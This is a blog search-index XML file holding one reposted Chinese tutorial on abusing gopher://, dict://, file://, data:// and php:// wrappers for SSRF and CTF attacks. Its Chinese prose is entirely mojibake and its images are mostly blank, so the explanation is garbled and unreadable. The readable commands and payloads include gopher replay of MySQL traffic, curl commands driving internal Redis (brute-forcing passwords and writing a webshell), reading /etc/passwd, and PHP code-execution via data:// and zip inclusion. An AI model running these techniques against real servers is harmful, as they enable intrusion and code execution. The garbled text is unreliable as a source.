<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>éå¸¸ç”¨åè®®è®°å½•</title>
    <url>/posts/ba5bdd23/</url>
    <content><![CDATA[<p>è®°å½•éå¸¸ç”¨åè®®çš„åŸºæœ¬ç”¨æ³•ï¼ˆè½¬è½½ï¼‰ã€‚å·²ç»è·å–ä½œè€…æˆæƒï¼Œå›¾ç‰‡é—®é¢˜æ­£åœ¨å’Œä½œè€…æ²Ÿé€šæ·»åŠ è½¬è½½å¾®ä¿¡æƒé™ã€‚</p>
<a id="more"></a>

<h1 id="SecMap-éå¸¸ç”¨åè®®å¤§ç¤¼åŒ…"><a href="#SecMap-éå¸¸ç”¨åè®®å¤§ç¤¼åŒ…" class="headerlink" title="SecMap - éå¸¸ç”¨åè®®å¤§ç¤¼åŒ…"></a>SecMap - éå¸¸ç”¨åè®®å¤§ç¤¼åŒ…</h1><ul>
<li>åŸæ–‡é“¾æ¥ï¼š<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvSExmQWNfYmlfcWhtaG5iZVN0aHZkZw==">https://mp.weixin.qq.com/s/HLfAc_bi_qhmhnbeSthvdg<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h2 id="â˜ï¸-çŸ¥è¯†ç‚¹ä»‹ç»"><a href="#â˜ï¸-çŸ¥è¯†ç‚¹ä»‹ç»" class="headerlink" title="â˜ï¸ çŸ¥è¯†ç‚¹ä»‹ç»"></a>â˜ï¸ çŸ¥è¯†ç‚¹ä»‹ç»</h2><p>è¿™é‡Œè¯´çš„ â€œéå¸¸ç”¨â€ æ˜¯ç›¸å¯¹äº HTTP è¿™ç§éå¸¸çŸ¥åçš„åè®®æ¥è¯´çš„ã€‚å¯¹äºåŒæ˜¯æå®‰å…¨çš„æ©˜å‹æ¥è¯´ï¼Œåƒ gopher è¿™ç§åè®®å…¶å®ä¹ŸæŒºå¸¸ç”¨çš„ï¼Œå„ä½æ— éœ€çº ç»“è¿™ä¸ªï¼Œæ„æ€ä¼ è¾¾åˆ°äº†å°±å¥½ <img src="https://mmbiz.qpic.cn/mmbiz/yZPTcMGWibvvLx6F9VHHuduYRiaYhaE4bw5hH9E5Ohaf0ibfjbYa6MickDgKBKHQ6nsoLZJ8zHESOzibW3Ce4Z6C7Zg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="å›¾ç‰‡"></p>
<h2 id="â˜ï¸-åè®®"><a href="#â˜ï¸-åè®®" class="headerlink" title="â˜ï¸ åè®®"></a>â˜ï¸ åè®®</h2><h3 id="ğŸŒ§-gopher"><a href="#ğŸŒ§-gopher" class="headerlink" title="ğŸŒ§ gopher://"></a>ğŸŒ§ gopher://</h3><p>åè®®è¯¦æƒ…ï¼š<span class="exturl" data-url="aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvR29waGVyXyglRTclQkQlOTElRTclQkIlOUMlRTUlOEQlOEYlRTglQUUlQUUp">https://zh.wikipedia.org/wiki/Gopher_(ç½‘ç»œåè®®)<i class="fa fa-external-link-alt"></i></span></p>
<p>gopher åè®®ï¼Œäººé€å¤–å·â€œä¸‡é‡‘æ²¹â€ï¼Œå› ä¸ºåˆ©ç”¨æ­¤åè®®å¯ä»¥æ”»å‡»å†…ç½‘çš„ Web åº”ç”¨ã€Redisã€MySQLã€FTPã€Memcache ç­‰ç­‰ã€‚æœ¬è´¨ä¸Šæ˜¯å› ä¸º gopher æºå¸¦çš„æ•°æ®å¯ä»¥æ’å…¥ <code>\r\n</code>ï¼ˆ<code>%0d%0a</code>ï¼‰ï¼Œè€Œå¾ˆå¤šç»„ä»¶å°±æ˜¯åˆ©ç”¨ <code>\r\n</code> æ¥åˆ†éš”è¿ç»­çš„ä¸¤æ¡å‘½ä»¤ï¼Œæ‰€ä»¥å®ƒå¯ä»¥ä¸å¾ˆå¤šç»„ä»¶è¿›è¡Œè¿ç»­äº¤äº’ï¼Œé‚£ä¹ˆä¹Ÿå°±å¯ä»¥å¾ˆæ–¹ä¾¿åœ°è¿›è¡Œæ”»å‡»äº†ã€‚</p>
<p>gopher åè®®çš„æ ¼å¼ï¼š<code>gopher://</code>+<code>ip:ç«¯å£</code>+<code>/</code>+<code>_</code> + <code>TCP/IP æ•°æ®</code></p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼š</p>
<ol>
<li>gopher åè®®çš„é»˜è®¤ç«¯å£ä¸º <code>70</code></li>
<li>è¿™é‡Œé¢çš„ <code>_</code>ï¼Œè¿™æ˜¯åˆ†éš”ç¬¦ï¼Œå…¶å®å¯ä»¥ç”¨ä»»æ„ ASCII å­—ç¬¦</li>
<li>åˆ†éš”ç¬¦åé¢çš„ TCP/IP æ•°æ®å°±æ˜¯å‘å‡ºå»çš„æ•°æ®ï¼Œæ•°æ®éƒ¨åˆ†å¦‚æœæœ‰ç‰¹æ®Šå­—ç¬¦å¿…é¡»è¦è¿›è¡Œ url ç¼–ç ï¼Œè¿™æ · gopher åè®®æ‰èƒ½æ­£ç¡®è§£æ</li>
<li>å¤§éƒ¨åˆ† PHP å¹¶ä¸ä¼šå¼€å¯ fopen çš„ gopher wrapper</li>
<li>PHP file_get_contents çš„ gopher åè®®ä¸èƒ½ URLencode</li>
<li>PHP file_get_contents çš„ gopher åè®®çš„ 302 è·³è½¬æœ‰ bugï¼Œå¯¼è‡´åˆ©ç”¨å¤±è´¥</li>
<li>PHP çš„ curl é»˜è®¤ä¸è·Ÿéš 302 è·³è½¬</li>
<li>curl/libcurl v7.43 ä¸Š gopher åè®®å­˜åœ¨ <code>%00</code> æˆªæ–­ï¼Œv7.49 å¯ç”¨</li>
</ol>
<p>ä¸‹é¢ä¸¾å‡ ä¸ªæ¯”è¾ƒå…¸å‹çš„ä¾‹å­ï¼Œå…¶å®åŸç†éƒ½æ˜¯ä¸€æ ·çš„ï¼Œå¾ˆå®¹æ˜“æ‹“å±•åˆ°æ”»å‡»å…¶ä»–ç»„ä»¶ã€‚</p>
<h4 id="â„ï¸-å‘å‡º-HTTP-è¯·æ±‚"><a href="#â„ï¸-å‘å‡º-HTTP-è¯·æ±‚" class="headerlink" title="â„ï¸ å‘å‡º HTTP è¯·æ±‚"></a>â„ï¸ å‘å‡º HTTP è¯·æ±‚</h4><p>ä¾‹å¦‚ï¼Œæˆ‘ä»¬æ‰“ç®—é€šè¿‡ gopher åè®®ï¼Œæ¥å®Œæˆä¸€æ¬¡ http è¯·æ±‚ï¼Œé‚£ä¹ˆæˆ‘ä»¬æœ€å°‘éœ€è¦å‘å‡ºè¿™äº›æ•°æ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: baidu.com</span><br></pre></td></tr></table></figure>

<p>é‚£ä¹ˆé¦–å…ˆï¼ŒæŠŠè¿™äº›æ•°æ®è¿›è¡Œ url ç¼–ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [1]: from urllib import parse</span><br><span class="line"></span><br><span class="line">In [2]: parse.quote(&#39;GET &#x2F; HTTP&#x2F;1.1\r\nHost: baidu.com\r\n\r\n&#39;)</span><br><span class="line">Out[2]: &#39;GET%20&#x2F;%20HTTP&#x2F;1.1%0D%0AHost%3A%20baidu.com%0D%0A%0D%0A&#39;</span><br></pre></td></tr></table></figure>

<p>ç„¶åç”¨ curl å³å¯é€šè¿‡ gopher åè®®å®Œæˆä¸€æ¬¡ http è¯·æ±‚ï¼š<img src="/posts/ba5bdd23/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="å›¾ç‰‡"></p>
<p>å½“ç„¶ POST ä¹Ÿæ˜¯å¯ä»¥çš„ã€‚</p>
<h4 id="â„ï¸-æ”»å‡»-MySQL"><a href="#â„ï¸-æ”»å‡»-MySQL" class="headerlink" title="â„ï¸ æ”»å‡» MySQL"></a>â„ï¸ æ”»å‡» MySQL</h4><p>åŒç†ï¼Œä¹Ÿå¯ä»¥è®¿é—®å…¶ä»–æœåŠ¡ï¼Œè¿™é‡Œæ¼”ç¤ºä¸€ä¸‹ MySQL çš„ã€‚</p>
<p>æ³¨æ„ï¼Œmysql çš„å®éªŒï¼Œéœ€è¦é…ç½® <code>skip_ssl</code> æ¥ç¦ç”¨ sslï¼Œå› ä¸º gopher æ— æ³•å¤„ç† ssl æ¡æ‰‹ã€‚</p>
<p>æŒ‰ç…§æˆ‘ä»¬å®é™…æƒ³è¦è¾¾æˆçš„ç›®çš„å»ä½¿ç”¨ mysqlï¼Œæˆ‘ç§°ä¹‹ä¸ºâ€œå½•åƒâ€ï¼ŒæœŸé—´ç”¨ wireshark æŠ“åŒ…ï¼Œç‚¹å‡»è·Ÿè¸ª TCP æµï¼š<img src="/posts/ba5bdd23/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="å›¾ç‰‡"></p>
<p>ç®€å•èµ·è§ï¼Œæˆ‘è¿™é‡Œä»…ä»…æ˜¯è¿ä¸Šå»ä¹‹åæ‰§è¡Œäº† <code>select &#39;tr0y&#123;Th1s_is_fl4g&#125;&#39;;</code> å°±é€€å‡ºäº†ï¼ˆæ³¨æ„ï¼Œè¿™é‡Œä¸€å®šè¦é€€å‡ºï¼ŒåŸå› è§ä¸‹é¢ï¼‰ã€‚é‚£ä¹ˆå¯ä»¥å¾—åˆ°ä¸‹é¢çš„æ•°æ®ï¼š<img src="/posts/ba5bdd23/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="å›¾ç‰‡"></p>
<p>æ³¨æ„æˆ‘ä»¬åªéœ€è¦å‘å‡ºæ•°æ®ï¼Œæ‰€ä»¥é€‰æ‹©å®¢æˆ·ç«¯å‘é€åˆ° MySQL æœåŠ¡å™¨çš„æ•°æ®åŒ…ï¼Œç„¶åå¯¼å‡ºåŸå§‹æ•°æ®ï¼š<img src="/posts/ba5bdd23/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="å›¾ç‰‡"></p>
<p>wireshark æ‰€è°“çš„â€œåŸå§‹æ•°æ®â€å…¶å®å°±æ˜¯åå…­è¿›åˆ¶çš„æ•°æ®ï¼Œè€Œæˆ‘ä»¬å°å­¦äºŒå¹´çº§å°±çŸ¥é“ï¼Œurl ç¼–ç å°±æ˜¯å­—ç¬¦çš„åå…­è¿›åˆ¶æ•°æ®è¡¨ç¤ºï¼Œå‰é¢åŠ ä¸ª %ï¼Œæ•…å¯å¾—ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ba00000185a6ff0900000001ff00000000000000000000000000000000000000000000005472307900010063616368696e675f736861325f70617373776f7264007c035f6f73086f737831302e3136095f706c6174666f726d067838365f36340f5f636c69656e745f76657273696f6e06382e302e32330c5f636c69656e745f6e616d65086c69626d7973716c045f706964053238303337076f735f757365720a6d6163723070686167330c70726f6772616d5f6e616d65056d7973716c2300000003000173656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420311e00000003000173656c6563742027747230797b546831735f69735f666c34677d270100000001</span><br></pre></td></tr></table></figure>

<p>ï¼ˆè¿™é‡Œçš„æ“ä½œå®é™…ä¸Šä¼šäº§ç”Ÿ 4 ä¸ªè¯·æ±‚æ•°æ®åŒ…ï¼Œç›´æ¥æ‹¼æ¥åœ¨ä¸€èµ·å³å¯ï¼‰</p>
<p>å‘å‡ºï¼š<img src="https://mmbiz.qpic.cn/mmbiz_png/9X75Rafjb4QjwHRcmh2VEMH7eHcmWdHEMpEnSdn2YkvFTU6MafDiblOvLy4bHG3c2Hat4GqeJAvL1iaMfjrWVVwQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="å›¾ç‰‡"></p>
<p>æ•´ä¸ªè¿‡ç¨‹å¯ä»¥çœ‹åšæ˜¯å…ˆå½•åˆ¶ä¸ MySQL äº¤äº’çš„è¿‡ç¨‹ï¼Œç„¶ååˆ©ç”¨ gopher å›æ”¾ï¼Œæ‰€ä»¥å½•åƒä¸­ä¸èƒ½æœ‰éšæœºå› ç´ ï¼Œæ¯”å¦‚ ssl æ¡æ‰‹ï¼Œå¦åˆ™å°±æ— æ³•å›æ”¾ã€‚</p>
<p>æœ€åæ€»ç»“ä¸€ä¸‹éœ€è¦æ³¨æ„çš„äº‹æƒ…ï¼š</p>
<ol>
<li>ç›®æ ‡ MySQL å¿…é¡»å…³é—­ sslï¼ˆé…ç½® <code>skip_ssl</code>ï¼‰</li>
<li>å½•åˆ¶çš„æ—¶å€™ï¼Œéœ€è¦ç”¨ <code>-h</code> æŒ‡å®š hostï¼Œå¦åˆ™å¦‚æœæ˜¯æ­å»ºåœ¨æœ¬åœ°çš„ mysqlï¼Œä¼šç›´æ¥é€šè¿‡ sock æ–‡ä»¶ï¼ˆé»˜è®¤æ˜¯ <code>/tmp/mysql.sock</code>ï¼‰è¿›è¡Œè¿›ç¨‹é€šä¿¡ï¼Œä¸èµ°ç½‘å¡æ‰€ä»¥æŠ“ä¸åˆ°åŒ…ã€‚</li>
<li>ç›®æ ‡ MySQL å¿…é¡»é…ç½®æ— éœ€è®¤è¯ã€‚å¦‚æœæ˜¯ç”¨ <code>caching_sha2_password</code> è¿›è¡Œè®¤è¯ï¼ˆç‰ˆæœ¬ <code>&gt;8.0</code> é»˜è®¤å°±æ˜¯è¿™ä¸ªè®¤è¯æ¨¡å¼ï¼‰çš„ç”¨æˆ·ï¼Œé‚£ä¹ˆ mysql æœåŠ¡ç«¯ä¼šè¦æ±‚å®¢æˆ·ç«¯å¿…é¡»å¯ç”¨ sslï¼›å¦‚æœæ˜¯ç”¨ <code>mysql_native_password</code> è¿›è¡Œè®¤è¯çš„ç”¨æˆ·ï¼Œé‚£ä¹ˆåœ¨è®¤è¯è¿‡ç¨‹ä¸­ä¼šæœ‰éšæœºçš„å­—ç¬¦å‡ºç°ï¼ˆåº”è¯¥æ˜¯ç”¨äº challengeï¼‰ã€‚ä»¥ä¸Šä¸¤ç§è®¤è¯æ¨¡å¼å‡æ— æ³•é€šè¿‡ gopher åˆ©ç”¨ã€‚</li>
<li>å½•åˆ¶å®Œæ¯•ä¹‹åï¼Œæ²¡æœ‰æ‰‹åŠ¨é€€å‡º mysql cliï¼Œé‚£ä¹ˆå°±éœ€è¦åœ¨æœ€ååŠ ä¸Š <code>%01%00%00%00%01</code>ï¼Œå¦åˆ™ curl ä¼šä¸€ç›´å¡ç€ï¼ˆè™½ç„¶è¿™æ—¶å€™æŠ“åŒ…å·²ç»å¯ä»¥çœ‹åˆ°å›æ˜¾äº†ï¼‰ï¼ŒåŸå› æ˜¯ curl æ²¡æ”¶åˆ°æœåŠ¡ç«¯å‘æ¥çš„ç»“æŸç¬¦ï¼Œè®¤ä¸ºè¿˜æœ‰å‰©ä½™çš„æ•°æ®åœ¨ç®¡é“ä¸­ï¼Œäºæ˜¯ç»§ç»­ç­‰å¾…ï¼Œè¡¨ç°å‡ºæ¥å°±æ˜¯ curl ä¸€ç›´å¡ç€ã€‚</li>
</ol>
<h4 id="â„ï¸-æ”»å‡»-Redis"><a href="#â„ï¸-æ”»å‡»-Redis" class="headerlink" title="â„ï¸ æ”»å‡» Redis"></a>â„ï¸ æ”»å‡» Redis</h4><p>æ²¡å•¥ç‰¹åˆ«çš„ï¼Œç®€ç›´å°±æ˜¯ä¸€ä¸ª redis-cli <img src="https://mmbiz.qpic.cn/mmbiz/yZPTcMGWibvvLx6F9VHHuduYRiaYhaE4bwMkmxegMW1ib4wticu1CP7nNL38teoypk4aVk68YYMomdbo14TRhQIptA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="å›¾ç‰‡">ï¼ŒRedis æœ‰å¯†ç æ— å¯†ç éƒ½å¯ï¼Œå¯ä»¥åˆ©ç”¨ <code>\r\n</code> æ‹¼æ¥æ¥ä¸€æ¬¡æ€§æ‰§è¡Œå¤šæ¡å‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># å³ auth 123456\r\nPING\r\nquit</span><br><span class="line">curl gopher:&#x2F;&#x2F;127.1:6001&#x2F;&#x2F;auth%20123456%0d%0aPING%0d%0aquit</span><br></pre></td></tr></table></figure>

<p>å½“ç„¶ï¼Œä¹Ÿå¯ä»¥ç”¨æ¥çˆ†ç ´å¯†ç ã€‚</p>
<h3 id="ğŸŒ§-dict"><a href="#ğŸŒ§-dict" class="headerlink" title="ğŸŒ§ dict://"></a>ğŸŒ§ dict://</h3><p>åè®®è¯¦æƒ…ï¼š<span class="exturl" data-url="aHR0cDovL2RpY3Qub3JnL3JmYzIyMjkudHh0">http://dict.org/rfc2229.txt<i class="fa fa-external-link-alt"></i></span></p>
<p>dict åè®®æ˜¯ä¸€ä¸ªå­—å…¸æœåŠ¡å™¨åè®®ï¼Œå°±æ˜¯ç”¨æ¥æŸ¥å•è¯çš„é‚£ç§å­—å…¸ã€‚å­—å…¸æœåŠ¡å™¨æœ¬æ¥æ˜¯ä¸ºäº†è®©å®¢æˆ·ç«¯ä½¿ç”¨è¿‡ç¨‹ä¸­èƒ½å¤Ÿè®¿é—®æ›´å¤šçš„å­—å…¸æºã€‚</p>
<p>dict åè®®çš„æ ¼å¼ï¼š<code>dict://</code>+<code>ip:ç«¯å£</code>+<code>/</code> + <code>TCP/IP æ•°æ®</code></p>
<p>ä¸ gopher ç›¸æ¯”ï¼Œdict æºå¸¦çš„æ•°æ®æ— æ³•æ’å…¥ <code>\r\n</code>ï¼ˆåªèƒ½æ’å…¥ <code>\\r\\n</code>ï¼‰ï¼Œæ‰€ä»¥å¯¹äºå¤§éƒ¨åˆ†ç»„ä»¶æ¥è¯´ï¼Œåªèƒ½æ‰§è¡Œä¸€æ¡å‘½ä»¤ï¼Œæ‰€ä»¥å¦‚æœä¸€ä¸ªç»„ä»¶å¯ä»¥ä¸€æ­¥ä¸€æ­¥æ“ä½œï¼ˆæ¯”å¦‚ redisï¼‰ï¼Œé‚£ä¹ˆæ‰å¯ä»¥åˆ©ç”¨ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾ï¼Œéœ€è¦è®¤è¯çš„ redis æ˜¯æ— æ³•é€šè¿‡ dict æ”»å‡»çš„ï¼ˆå³ä½¿ä½ çŸ¥é“å¯†ç ä¹Ÿæ²¡ç”¨ï¼‰ï¼Œä½†æ˜¯å¯ä»¥ç”¨æ¥çˆ†ç ´å¯†ç ã€‚</p>
<p>è¿™é‡Œä¸¾ä¸ª Redis çš„ä¾‹å­ï¼Œç”±äº dict:// ç›¸å¯¹æ¯”è¾ƒé¸¡è‚‹ä¸€äº›ï¼Œæ‰€ä»¥ç®—æ˜¯ä¸€ä¸ªä½é…çš„ redis-cli <img src="/posts/ba5bdd23/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="å›¾ç‰‡"></p>
<p>é¦–å…ˆæ¼”ç¤ºä¸€ä¸‹ set/getï¼š<img src="/posts/ba5bdd23/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="å›¾ç‰‡"></p>
<p>å†æ¥ä¸ªå†™ webshell çš„ï¼š<img src="/posts/ba5bdd23/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="å›¾ç‰‡"></p>
<p>éœ€è¦æ³¨æ„çš„ç‚¹ï¼š</p>
<ol>
<li>è‹¥æœ€åçš„ payload éœ€è¦ç”¨ç©ºæ ¼ï¼Œé‚£ä¹ˆåœ¨ dict é‡Œéœ€è¦ç”¨ <code>:</code> è¡¨ç¤ºï¼Œå³ <code>dict://127.0.0.1:80/set:key:1</code> ç­‰äº <code>set key 1</code>ã€‚</li>
<li>curl åœ¨é€šè¿‡ dict æ‰§è¡Œçš„æ—¶å€™ï¼Œä¼šåœ¨å‰åè‡ªåŠ¨åŠ ä¸Šå®¢æˆ·ç«¯ç‰ˆæœ¬å’Œ QUITï¼š<img src="/posts/ba5bdd23/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" alt="å›¾ç‰‡">è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆä¸Šé¢é‚£ä¸ª redis çš„ä¾‹å­ä¸­ï¼Œç¬¬ä¸€è¡Œæ°¸è¿œæ˜¯é”™è¯¯ï¼Œæœ€åä¸€è¡Œæ°¸è¿œæ˜¯ <code>+OK</code> çš„åŸå› </li>
<li>ç”±äº dict:// åè®®åœ¨å‡ºç° <code>?</code> çš„æ—¶å€™ä¼šæˆªæ–­åé¢çš„æ•°æ®ï¼š<img src="https://mmbiz.qpic.cn/mmbiz_png/9X75Rafjb4QjwHRcmh2VEMH7eHcmWdHEqM0yURhvgxSOiczib7JIURTOEO0LegajkrA4G4TS5cekzspHbiat2SChw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="å›¾ç‰‡">è¿™é‡Œçš„æ€è·¯å°±æ˜¯å…ˆæŠŠæ•°æ®ä¼ ç»™ç»„ä»¶ï¼Œç„¶åè®©ç»„ä»¶å»å®Œæˆè½¬ä¹‰ï¼Œæ¯”å¦‚ <code>set key &quot;1\x3f1&quot;</code> å¯¹äº redis æ¥è¯´ç­‰äº <code>set key &quot;1?1&quot;</code>ï¼Œæ‰€ä»¥ dict:// å°±å¯ä»¥è¿™æ ·ï¼š<code>curl &#39;dict://127.1:6379/set:key:&quot;1\x3f1&quot;&#39;</code>ã€‚ä¸Šé¢é‚£ä¸ªå†™ webshell çš„ä¾‹å­å°±æ˜¯å› ä¸ºè¿™ä¸ªåŸå› æ‰€ä»¥è¿›è¡Œäº†è½¬ä¹‰ã€‚</li>
</ol>
<h3 id="ğŸŒ§-file"><a href="#ğŸŒ§-file" class="headerlink" title="ğŸŒ§ file://"></a>ğŸŒ§ file://</h3><p>åè®®è¯¦æƒ…ï¼š</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9kb2NzLm1pY3Jvc29mdC5jb20vZW4tdXMvcHJldmlvdXMtdmVyc2lvbnMvL2FhNzY3NzMxKHY9dnMuODUp">https://docs.microsoft.com/en-us/previous-versions//aa767731(v=vs.85)<i class="fa fa-external-link-alt"></i></span></p>
<p>è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œè¿™ä¸ªæ²¡å•¥å¥½è¯´çš„ï¼š<code>curl file:///etc/passwd</code></p>
<p>æ¯”å¦‚æµè§ˆå™¨è¯»å–æœ¬åœ°æ–‡ä»¶çš„æ—¶å€™ï¼Œç”¨çš„ä¹Ÿæ˜¯è¿™ä¸ªåè®®ï¼š<img src="https://mmbiz.qpic.cn/mmbiz_png/9X75Rafjb4QjwHRcmh2VEMH7eHcmWdHEVfX5pmlQZYJAhk0geicephib4Tt76xFKdUT6DibbL0ZWl0A2LKbiabcFAQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="å›¾ç‰‡"></p>
<p>å¯¹äº PHP çš„æ–‡ä»¶åŒ…å«æœ‰ä¸ªéªšæ“ä½œå°±æ˜¯ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªåä¸º <code>&lt;?php phpinfo(); ?&gt;.txt</code> çš„æ–‡ä»¶ï¼Œç„¶åå‹ç¼©ä¸Šä¼ ï¼Œæ¥ä¸‹æ¥ç›´æ¥åŒ…å«å³å¯ï¼ˆéœ€è¦ç»å¯¹è·¯å¾„ï¼‰ï¼š<code>include(&quot;file://wwwhtml/upload/test.zip&quot;);</code>ï¼Œå½“ç„¶ï¼Œ<code>.tar</code>ã€<code>.zip</code> éƒ½å¯ä»¥ã€‚è‡³äºåŸç†ï¼Œè´´ä¸ªå›¾å¤§å®¶å°±éƒ½æ‡‚å•¦ï¼š<img src="https://mmbiz.qpic.cn/mmbiz_png/9X75Rafjb4QjwHRcmh2VEMH7eHcmWdHEE6pmSpfY8CODkj6RSAY5CMYrUpaEpMlMdqS9vQt3mwCdm8px4ln6Pg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="å›¾ç‰‡"></p>
<h3 id="ğŸŒ§-data"><a href="#ğŸŒ§-data" class="headerlink" title="ğŸŒ§ data://"></a>ğŸŒ§ data://</h3><ul>
<li><p>ä½œç”¨ï¼šData URI scheme æ˜¯åœ¨ RFC2397 ä¸­å®šä¹‰çš„ï¼Œç›®çš„æ˜¯å°†ä¸€äº›å°çš„æ•°æ®ï¼Œç›´æ¥åµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œä»è€Œä¸ç”¨å†ä»å¤–éƒ¨æ–‡ä»¶è½½å…¥</p>
</li>
<li><p>æ¡ä»¶ï¼š</p>
</li>
<li><ul>
<li><code>allow_url_include</code>: <code>On</code></li>
<li>PHP &gt;= 5.2.0</li>
</ul>
</li>
</ul>
<p>æ ¼å¼ä¸º <code>data:(//)[class](/)[type](;base64),payload</code>ï¼š</p>
<ol>
<li><code>//</code> å¯ä»¥çœç•¥</li>
<li><code>/</code> å¯ä»¥çœç•¥ï¼Œç‰¹æ®Šæƒ…å†µåœ¨ä¸‹é¢</li>
<li><code>[class]</code>ã€<code>[type]</code>: å¯ä»¥çœç•¥ï¼Œä»»æ„å­—ç¬¦ï¼›å¦‚æœè¦å†™å…¶ä¸­ä¸€ä¸ªï¼Œé‚£ä¹ˆ <code>/</code> ä¸å¯çœç•¥ï¼Œå¦ä¸€ä¸ªä¸ºå¯ç©ºã€‚</li>
<li><code>;base64</code> å¯ä»¥çœç•¥ï¼›å¦‚æœè¦åŠ çš„è¯ï¼Œpayload å¿…é¡»ç»è¿‡ base64 ç¼–ç </li>
</ol>
<p>è¿™äº›åœ¨ PHP é‡Œéƒ½æ˜¯å¯ä»¥çš„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:&#x2F;&#x2F;tr0y&#x2F;tr0y;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line">data:tr0y&#x2F;tr0y;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line">data:tr0y&#x2F;;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line">data:&#x2F;;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line">data:;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br><span class="line">data:,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<p>è¯¥åè®®ç±»ä¼¼äº php://inputï¼ŒåŒºåˆ«åœ¨äº data:// æ˜¯ç›´æ¥è·å–åé¢è·Ÿç€çš„å†…å®¹ã€‚æµè§ˆå™¨ä¸€èˆ¬éƒ½æ”¯æŒè¿™ä¸ªåè®®ï¼Œæœ€å¸¸ç”¨çš„è«è¿‡äºå±•ç¤ºå°å›¾ç‰‡äº†ï¼›åœ¨ CTF ä¸­å¸¸ç”¨äºæ‰§è¡Œä»»æ„ PHP ä»£ç ã€‚</p>
<p>æ¯ä¸ªç»„ä»¶æ”¯æŒçš„ä¼šç¨å¾®æœ‰ç‚¹åŒºåˆ«ï¼Œä¾‹å¦‚ <code>data:;,&lt;?php phpinfo();?&gt;</code> åœ¨ Chrome å¯ä»¥ï¼Œä½†æ˜¯åœ¨ PHP ä¸è¡Œã€‚</p>
<h3 id="ğŸŒ§-php"><a href="#ğŸŒ§-php" class="headerlink" title="ğŸŒ§ php://"></a>ğŸŒ§ php://</h3><p><code>php://</code>ï¼šè®¿é—®å„ä¸ªè¾“å…¥/è¾“å‡ºæµï¼ˆI/O streamsï¼‰ã€‚PHP æä¾›äº†ä¸€äº›æ‚é¡¹è¾“å…¥/è¾“å‡ºï¼ˆIOï¼‰æµï¼Œå…è®¸è®¿é—® PHP çš„è¾“å…¥è¾“å‡ºæµã€æ ‡å‡†è¾“å…¥è¾“å‡ºå’Œé”™è¯¯æè¿°ç¬¦ï¼›å†…å­˜ä¸­ã€ç£ç›˜å¤‡ä»½çš„ä¸´æ—¶æ–‡ä»¶æµä»¥åŠå¯ä»¥æ“ä½œå…¶ä»–è¯»å–å†™å…¥æ–‡ä»¶èµ„æºçš„è¿‡æ»¤å™¨ã€‚</p>
<p>å¯ä»¥çœ‹å®˜æ–¹æ–‡æ¡£çš„ä»‹ç»ï¼š<span class="exturl" data-url="aHR0cHM6Ly93d3cucGhwLm5ldC9tYW51YWwvemgvd3JhcHBlcnMucGhwLnBocA==">https://www.php.net/manual/zh/wrappers.php.php<i class="fa fa-external-link-alt"></i></span></p>
<p>å±äº PHP ä¸­çš„ä¼ªåè®®ï¼Œä¸€èˆ¬å—é™äº php.ini ä¸­çš„é…ç½®ï¼Œæ‰€ä»¥ä¸‹æ–‡ä¼šä¸€å¹¶åˆ—å‡ºä½¿ç”¨æ¡ä»¶ã€‚</p>
